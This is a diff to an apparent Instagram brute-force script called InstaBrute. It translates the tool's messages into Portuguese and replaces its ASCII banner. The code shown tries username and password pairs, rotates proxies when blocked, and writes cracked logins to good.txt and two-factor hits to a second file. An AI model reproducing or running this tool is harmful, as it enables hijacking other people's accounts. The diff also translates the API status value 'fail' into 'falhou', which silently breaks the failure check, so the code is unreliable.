@@ -20,16 +20,12 @@ onlyPasswords = False
 
 
 print('''
-                   _         _
-             (_)       | |
-  ___   ___   _  _ __  | |__    __ _  ___   ___
- / __| / _ \ | || '_ \ | '_ \  / _` |/ __| / _ \
-| (__ | (_) || || | | || |_) || (_| |\__ \|  __/
- \___| \___/ |_||_| |_||_.__/  \__,_||___/ \___|
-
-
-                          
-     
+               
+                           __         __
+.----..-----.|__|.-----.|  |--..---.-..-----..-----.
+|  __||  _  ||  ||     ||  _  ||  _  ||__ --||  -__|
+|____||_____||__||__|__||_____||___._||_____||_____|
+         
 Author   : Gilmarfilho
 
 depende de vpn. Use-o antes de executar a ferramenta ou fornecer um arquivo proxy        """"""""""""""""""""""""""""""""""""""""""
@@ -124,10 +120,10 @@ class InstaBrute(object):
 
             
             data = json.loads(r.text)
-            if (data['status'] == 'fail'):
+            if (data['status'] == 'falhou'):
                 print(red_color +'')
                 print(data['message'])
-                print('--> not proxy تحتاج بروكسي')
+                print('--> não proxy precisa de um proxy')
                 UsePorxy = self.randomProxy()
             print('----------------------------')
             print (green_color + 'username: '+ user + ' | '' password: '+ pwd )
@@ -141,7 +137,7 @@ class InstaBrute(object):
                 with open('good.txt', 'a') as x:
                     x.write(user + ':' + pwd + '\n')
             elif 'two_factor_required' in r.text:
-                print(('' + user + ':' + pwd + ' -->  Good It has to be checked '))
+                print(('' + user + ':' + pwd + ' -->  Bom Tem que ser verificado '))
                 with open('results_NeedVerfiy.txt', 'a') as x:
                     x.write(user + ':' + pwd + '\n')
 
